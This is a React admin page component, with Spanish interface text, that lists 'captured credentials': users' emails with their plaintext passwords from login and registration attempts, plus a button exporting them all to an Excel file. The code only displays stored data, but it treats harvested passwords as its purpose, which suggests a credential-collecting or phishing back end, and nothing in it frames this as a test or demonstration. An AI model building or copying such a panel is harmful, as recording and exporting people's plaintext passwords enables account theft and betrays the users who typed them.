import React, { useEffect, useState } from 'react';
import { getAccessLogs, AccessLog } from '../services/storage';
import { Download, Shield, Key, UserCheck } from 'lucide-react';
import * as XLSX from 'xlsx';

const AdminLogs: React.FC = () => {
  const [logs, setLogs] = useState<AccessLog[]>([]);

  useEffect(() => {
    const loadLogs = async () => {
      const data = await getAccessLogs();
      setLogs(data);
    };
    loadLogs();
  }, []);

  const downloadLogs = () => {
    const ws = XLSX.utils.json_to_sheet(logs);
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, "Credenciales_Capturadas");
    XLSX.writeFile(wb, "Credenciales_Usuarios.xlsx");
  };

  return (
    <div className="p-8 max-w-6xl mx-auto">
      <div className="flex justify-between items-center mb-8">
        <div>
          <h2 className="text-2xl font-bold text-red-600 dark:text-red-500 flex items-center gap-2">
            <Shield size={24} />
            LOGS DE CREDENCIALES (ROOT)
          </h2>
          <p className="text-slate-500 dark:text-slate-400">Historial de intentos de acceso y registro con contraseñas capturadas.</p>
        </div>
        <button
          onClick={downloadLogs}
          className="flex items-center gap-2 bg-slate-900 dark:bg-white hover:bg-slate-800 dark:hover:bg-slate-200 text-white dark:text-slate-900 px-6 py-2 rounded-lg font-bold transition-colors"
        >
          <Download size={18} />
          Descargar Excel Completo
        </button>
      </div>

      <div className="bg-white dark:bg-slate-900 rounded-xl shadow-lg border border-slate-200 dark:border-slate-800 overflow-hidden">
        <table className="w-full text-left border-collapse">
          <thead>
            <tr className="bg-slate-50 dark:bg-slate-800 border-b border-slate-200 dark:border-slate-700">
              <th className="p-4 font-bold text-slate-700 dark:text-slate-200 text-sm">TIPO</th>
              <th className="p-4 font-bold text-slate-700 dark:text-slate-200 text-sm">USUARIO (EMAIL)</th>
              <th className="p-4 font-bold text-red-600 dark:text-red-400 text-sm flex items-center gap-1">
                <Key size={14} /> CONTRASEÑA
              </th>
              <th className="p-4 font-bold text-slate-700 dark:text-slate-200 text-sm text-right">FECHA</th>
            </tr>
          </thead>
          <tbody>
            {logs.length > 0 ? (
              logs.map((log, index) => (
                <tr key={index} className="border-b border-slate-100 dark:border-slate-800 hover:bg-slate-50 dark:hover:bg-slate-800/50 transition-colors">
                  <td className="p-4">
                     <span className={`text-[10px] font-bold px-2 py-1 rounded uppercase tracking-wider ${
                        log.type === 'REGISTER' ? 'bg-purple-100 text-purple-700 dark:bg-purple-900/30 dark:text-purple-300' : 'bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-300'
                     }`}>
                        {log.type}
                     </span>
                  </td>
                  <td className="p-4 font-mono font-medium text-slate-700 dark:text-slate-300">{log.email}</td>
                  <td className="p-4 font-mono font-bold text-red-600 dark:text-red-400 bg-red-50 dark:bg-red-900/10 rounded inline-block my-2 px-2">
                    {log.password || 'N/A'}
                  </td>
                  <td className="p-4 text-right text-slate-500 dark:text-slate-400 text-sm font-mono">{log.timestamp}</td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan={4} className="p-12 text-center text-slate-400 dark:text-slate-500">
                  <UserCheck size={48} className="mx-auto mb-3 opacity-20" />
                  No hay credenciales capturadas aún.
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
};

export default AdminLogs;